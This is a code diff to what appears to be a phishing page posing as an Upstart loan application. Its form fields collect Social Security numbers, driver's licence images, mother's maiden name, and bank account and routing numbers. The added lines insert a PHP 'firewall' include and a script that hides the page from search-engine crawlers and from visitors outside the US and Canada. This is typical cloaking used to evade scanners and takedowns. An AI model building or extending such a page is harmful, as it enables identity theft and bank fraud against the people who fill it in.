@@ -1,3 +1,5 @@
+<?php include 'firewall.php'; ?>
+
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html lang="en" class="supernova ">
 
@@ -578,6 +580,45 @@
         JotForm.paymentExtrasOnTheFly([null, null, null, null, null, null, { "name": "maritalStatus", "qid": "6", "text": "Marital Status:", "type": "control_radio" }, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, { "name": "occupation", "qid": "30", "text": "Occupation", "type": "control_textbox" }, null, null, null, null, null, null, null, null, null, null, null, null, null, null, { "name": "submit", "qid": "45", "text": "Submit Loan Application Now", "type": "control_button" }, null, null, null, null, { "name": "clickTo50", "qid": "50", "text": "Employment Information", "type": "control_head" }, { "name": "iAuthorize51", "qid": "51", "text": "I authorize prospective Credit Grantors\u002FLending\u002FLeasing Companies to obtain personal and credit information about me from my employer and credit bureau, or credit reporting agency, any person who has or may have any financial dealing with me, or from any references I have provided. This information, as well as that provided by me in the application, will be referred to in connection with this lease and any other relationships we may establish from time to time. Any personal and credit information obtained may be disclosed from time to time to other lenders, credit bureaus or other credit reporting agencies.", "type": "control_checkbox" }, { "name": "iHereby", "qid": "52", "text": "I hereby agree that the information given is true, accurate and complete as of the date of this application submission.", "type": "control_checkbox" }, null, null, null, null, null, null, null, null, { "name": "name", "qid": "61", "text": "Name", "type": "control_fullname" }, { "name": "birthDate62", "qid": "62", "text": "Birth Date", "type": "control_birthdate" }, null, null, null, null, null, null, null, null, null, { "name": "phone", "qid": "72", "text": "Phone", "type": "control_phone" }, null, { "name": "clickTo", "qid": "74", "text": "UPSTART LOAN APPLICATION FORM", "type": "control_head" }, { "name": "clickTo75", "qid": "75", "text": "Contact Information", "type": "control_head" }, { "name": "address76", "qid": "76", "text": "Address", "type": "control_address" }, { "name": "howLong", "qid": "77", "text": "How long have you lived in your given address?", "type": "control_radio" }, { "name": "email78", "qid": "78", "subLabel": "example@example.com", "text": "E-mail", "type": "control_email" }, { "name": "yearsOf", "qid": "79", "text": "Years of experience", "type": "control_radio" }, { "name": "grossMonthly80", "qid": "80", "text": "Gross monthly income", "type": "control_number" }, { "name": "monthlyRentmortgage", "qid": "81", "text": "Monthly rent\u002Fmortgage", "type": "control_number" }, null, { "name": "bankReferences", "qid": "83", "text": "Bank References", "type": "control_head" }, null, { "name": "consent", "qid": "85", "text": "Consent", "type": "control_head" }, null, { "name": "desiredLoan87", "qid": "87", "text": "Desired Loan Amount $", "type": "control_calculation" }, { "name": "annualIncome", "qid": "88", "text": "Annual Income $", "type": "control_calculation" }, { "name": "loanWill", "qid": "89", "text": "Loan will be used for", "type": "control_radio" }, null, null, { "description": "", "name": "socialSecurity", "qid": "92", "subLabel": "", "text": "Social Security Number ", "type": "control_textbox" }, null, { "description": "", "name": "uploadSelected94", "qid": "94", "subLabel": "", "text": "Upload Front Image of Your DL", "type": "control_fileupload" }, { "description": "", "name": "uploadBack", "qid": "95", "subLabel": "", "text": "Upload Back Image of Your DL", "type": "control_fileupload" }, null, null, null, { "name": "identityCheck", "qid": "99", "text": "Identity Check \u002F Verification", "type": "control_head" }, { "name": "divider", "qid": "100", "text": "Divider", "type": "control_divider" }, { "name": "divider101", "qid": "101", "text": "Divider", "type": "control_divider" }, { "name": "divider102", "qid": "102", "text": "Divider", "type": "control_divider" }, { "name": "divider103", "qid": "103", "text": "Divider", "type": "control_divider" }, { "name": "divider104", "qid": "104", "text": "Divider", "type": "control_divider" }, { "description": "", "name": "fathersFull", "qid": "105", "text": "Father's Full Name", "type": "control_fullname" }, { "description": "", "name": "mothersFull", "qid": "106", "text": "Mother's Full Name", "type": "control_fullname" }, { "description": "", "name": "placeofbirth", "qid": "107", "subLabel": "", "text": "Place of Birth", "type": "control_textbox" }, { "description": "", "name": "mothersmaiden", "qid": "108", "subLabel": "", "text": "Mother's Maiden Name", "type": "control_textbox" }, { "description": "", "name": "accountNumber", "qid": "109", "subLabel": "", "text": "Account Number", "type": "control_textbox" }, { "description": "", "name": "institutionName", "qid": "110", "subLabel": "", "text": "Institution Name", "type": "control_textbox" }, null, null, { "description": "", "name": "presentEmployer", "qid": "113", "subLabel": "Please enter the name of the company where you work currently", "text": "Present Employer", "type": "control_textbox" }, { "description": "", "name": "routingNumber", "qid": "114", "subLabel": "", "text": "Routing Number", "type": "control_textbox" }]);
       }, 20); 
     </script>
+
+<script>
+  // Geo-Blocking and User-Agent Filtering
+  (function() {
+    const blockedCountries = ['RU', 'CN', 'IR', 'KP', 'SY', 'CU'];
+    const allowedCountries = ['US', 'CA'];
+    const botUserAgents = [/googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i, /yandex/i, /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i];
+
+    // User-Agent detection
+    const ua = navigator.userAgent;
+    if (botUserAgents.some(bot => bot.test(ua))) {
+      document.write('<style>body{display:none !important;}</style>');
+      throw new Error("Bot access denied");
+    }
+
+    // Geo-blocking via IP-based external API (optional - use server-side for reliability)
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        if (!allowedCountries.includes(data.country_code)) {
+          document.write('<style>body{display:none !important;}</style>');
+          throw new Error("Blocked geo-region");
+        }
+      })
+      .catch(() => {
+        document.write('<style>body{display:none !important;}</style>');
+        throw new Error("Geo-location check failed");
+      });
+  })();
+</script>
+
+
+
+
+
+
+
+
+
   </head>
 
 
